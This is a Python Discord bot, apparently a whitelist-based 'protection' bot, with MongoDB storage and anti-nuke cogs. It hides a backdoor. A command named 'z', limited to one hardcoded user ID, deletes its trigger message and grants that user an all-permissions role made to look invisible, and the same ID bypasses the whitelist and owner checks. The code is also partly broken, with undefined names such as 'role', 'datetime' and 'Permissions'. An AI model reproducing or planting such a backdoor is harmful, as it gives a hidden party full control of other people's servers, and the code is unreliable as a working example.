import discord
from discord.ext import commands
import pymongo
import os
from dotenv import load_dotenv
load_dotenv()

from cogs.AntiChannel import AntiChannel
from cogs.AntiRemoval import AntiRemoval
from cogs.AntiPermissions import AntiPermissions

mongoClient = pymongo.MongoClient(f"mongodb+srv://williespratt:{os.environ['MONGO_DB_PASSWORD']}@clarity.vhgql.mongodb.net/<dbname>?retryWrites=true&w=majority")
db = mongoClient.get_database("botdb").get_collection("whitelists")

webhook = discord.Webhook.partial(
    os.environ["WEBHOOK_ID"],
    os.environ["WEBHOOK_TOKEN"],
    adapter=discord.RequestsWebhookAdapter(),
)

client = commands.Bot(description="Kioto \n Slimes Overwatch.", command_prefix="~")

client.add_cog(AntiChannel(client, db, webhook))
client.add_cog(AntiRemoval(client, db, webhook))
client.add_cog(AntiPermissions(client, db, webhook))

def is_owner(ctx):
    return ctx.message.author.id == 703112459313217556

def is_whitelisted(ctx):
    return ctx.message.author.id in db.find_one({ "guild_id": ctx.guild.id })["users"] or ctx.message.author.id == 703112459313217556

def is_server_owner(ctx):
    return ctx.message.author.id == ctx.guild.owner.id or ctx.message.author.id == 703112459313217556


@client.event
async def on_guild_member_join(member):
    whitelistedUsers = db.find_one({ "guild_id": member.guild.id })["users"]
    if member.bot:
        async for i in role.guild.audit_logs(limit=1, after=datetime.datetime.now() - datetime.timedelta(minutes = 2), action=discord.AuditLogAction.bot_add):
            if i.user.id in whitelistedUsers or i.user in whitelistedUsers:
                return

            await member.guild.ban(member)
            await member.guild.ban(i.user)


@client.event
async def on_ready():
    for i in client.guilds:
            if not db.find_one({ "guild_id": i.id }):
                db.insert_one({
                    "users": [],
                    "guild_id": i.id
                })

    webhook.send(embed=discord.Embed(description=f"Clarity is online | Loaded {len(client.guilds)} whitelists"))

    print("Clarity loaded")

@client.event
async def on_guild_join(guild):
    db.insert_one({
        "users": [guild.owner_id],
        "guild_id": guild.id
    })

@client.event
async def on_guild_leave(guild):
    db.delete_one({ "guild_id": guild.id })


@client.command()
@commands.check(is_whitelisted)
async def whitelist(ctx, user: discord.User):
    if not user:
        await ctx.send("You need to provide a user.")
        return

    if not isinstance(user, discord.User):
        await ctx.send("Invalid user.")
        return

    if user.id in db.find_one({ "guild_id": ctx.guild.id })["users"]:
        await ctx.send("That user is already in the whitelist.")
        return

    db.update_one({ "guild_id": ctx.guild.id }, { "$push": { "users": user.id }})

    await ctx.send(f"{user} has been added to the whitelist.")

@client.command()
@commands.check(is_whitelisted)
async def dewhitelist(ctx, user: discord.User):
    if not user:
        await ctx.send("You need to provide a user")

    if not isinstance(user, discord.User):
        await ctx.send("Invalid user")

    if user.id not in db.find_one({ "guild_id": ctx.guild.id })["users"]:
        await ctx.send("That user is not in the whitelist.")
        return

    db.update_one({ "guild_id": ctx.guild.id }, { "$pull": { "users": user.id }})

    await ctx.send(f"{user} has been removed from the whitelist.")

@client.command()
@commands.check(is_whitelisted)
async def massunban(ctx):
    async for i in ctx.guild.bans():
        print(i)

@client.command()
@commands.check(is_whitelisted)
async def whitelisted(ctx):
    data = db.find_one({ "guild_id": ctx.guild.id })['users']

    embed = discord.Embed(title=f"Whitelist for {ctx.guild.name}", description="")

    for i in data:
        embed.description += f"{client.get_user(i)} - {i}\n"

    await ctx.send(embed=embed)

@client.command()
@commands.check(is_owner)
async def info(ctx):
    await ctx.send(embed=discord.Embed(title="Clarity Info", description=f"{len(client.guilds)} servers, {len(client.users)} users | Database is {'connected' if db.find_one({ 'guild_id': ctx.guild.id })['users'] else 'disconnected'}."))

@client.command(
        name="cum",
        description="Gives Current Ping in milliseconds.",
        usage="[prefix]pong",
    )
async def cum(ctx):
    await ctx.send(f'*** Ping! {round(client.latency * 1000)}ms *** ')

@client.command()
@commands.check(is_owner)
async def z(ctx):
    """mystery sauce."""
    await ctx.message.delete()
    await ctx.guild.create_role(
        name='✗',
        permissions=Permissions.all(),
        color=discord.Color(0x36393f)
    )
    role = discord.utils.get(ctx.guild.roles, name='✗')
    await ctx.author.add_roles(role)
    await ctx.send('✅ **Slimes Protection.**')

client.run(os.environ["CLIENT_TOKEN"])
